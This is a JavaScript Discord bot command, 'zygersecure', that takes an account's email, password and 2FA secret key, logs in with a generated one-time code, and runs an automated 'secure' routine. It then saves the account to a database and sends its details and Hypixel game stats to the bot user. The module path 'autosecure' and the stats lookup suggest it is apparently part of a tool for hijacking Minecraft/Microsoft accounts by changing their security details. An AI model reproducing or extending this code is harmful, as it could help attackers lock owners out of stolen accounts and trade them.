const generateotp = require("../../utils/secure/codefromsecret.js");
const generateuid = require("../../utils/generateuid.js");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const login = require('../../utils/secure/login.js')
const secure = require("../../utils/secure/recodesecure.js");
const statsembed = require("../../utils/stats/statsembed.js");
const fetchStats = require("../../utils/hypixelapi/fetchStats.js");
const listAccount = require("../../utils/accounts/listAccount.js");
const insertaccount = require('../../../db/insertaccount')
const { queryParams } = require('../../../db/database.js')
const getStats = require("../../utils/hypixelapi/getStats.js")
const short = require("short-number")
const mcregex = require("../../.././autosecure/utils/utils/mcregex.js")
const { failedembed } = require("../../utils/embeds/embedhandler.js");

module.exports = {
    name: "zygersecure",
    userOnly: true,
    callback: async (client, interaction) => {
        try {

            let settings = await client.queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id])
            if (settings.length === 0) {
                return interaction.reply({
                    embeds: [{
                        title: `Error :x:`,
                        description: `Unexpected error occurred!`,
                        color: 0xff0000
                    }],
                    ephemeral: true
                });
            }
            settings = settings[0];
            const email = interaction.components[0].components[0].value.trim();
            const password = interaction.components[1].components[0].value.trim();
            const secretkey = interaction.components[2].components[0].value.trim();
            const mcign = interaction.components[3].components[0].value ? interaction.components[3].components[0].value.trim() : null;
    
            if (mcign && !mcregex(mcign)){
                return interaction.reply({
                    content: "Please enter a valid minecraft username!",
                    ephemeral: true
                })
            }


            await interaction.deferReply({ ephemeral: true });

            console.log('[ZYGER_SECURE] Initiating zyger secure authentication...');

            const { otp } = await generateotp(secretkey);

            let host = await login({ otp: otp, email: email, pw: password }, null);
            console.log(`[ZYGER_SECURE] Authentication result: ${host ? 'success' : 'failed'}`);

            if (host === "tfa") {
                return interaction.editReply({
                    content: "Invalid details / 2fa is disabled, try recovery securing! Try to manually login and resolve issues.",
                    ephemeral: true
                });
            }

            if (!host) {
                return interaction.editReply({
                    embeds: [{
                        title: `Failed`,
                        description: `Password or secretkey seems to be wrong!`,
                        color: 0xff0000
                    }],
                });
            }

            let uid = await generateuid();
            const embed = {
                title: 'This account is being automatically secured.',
                color: 0x808080
            };

            const components = [
                new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId(`status|${uid}`)
                        .setLabel('⏳ Status')
                        .setStyle(ButtonStyle.Primary)
                )
            ];

            await interaction.editReply({ embeds: [embed], components });
            await interaction.user.send({ embeds: [embed], components });

            try {
                console.log(`uid: ${uid}`);

                let acc = await secure(host, settings, uid, mcign);


                await insertaccount(acc, uid, interaction.user.id, settings.secureifnomc);


                    const failedmsg = await failedembed(acc, uid);

                    if (failedmsg.failed) {
                        await interaction.followUp(failedmsg.failedmsg);
                        await interaction.user.send(failedmsg.failedmsg);
                        return;
                    }


                let accountmessage = await listAccount(acc, uid, client, interaction);
                await interaction.user.send(accountmessage).catch(() => {});
                await interaction.editReply(accountmessage).catch(() => {});
            } catch (error) {
                console.log(error);

                await interaction.editReply({
                    embeds: [{
                        title: `Error Securing Account`,
                        description: `An error occurred while securing your account.`,
                        color: 0xff0000
                    }],
                });
            }
        } catch (error) {
            console.error("Command execution error:", error);
            await interaction.editReply({
                embeds: [{
                    title: `Error`,
                    description: `An unexpected error occurred while processing your request.`,
                    color: 0xff0000
                }],
            });
        }
    }
};
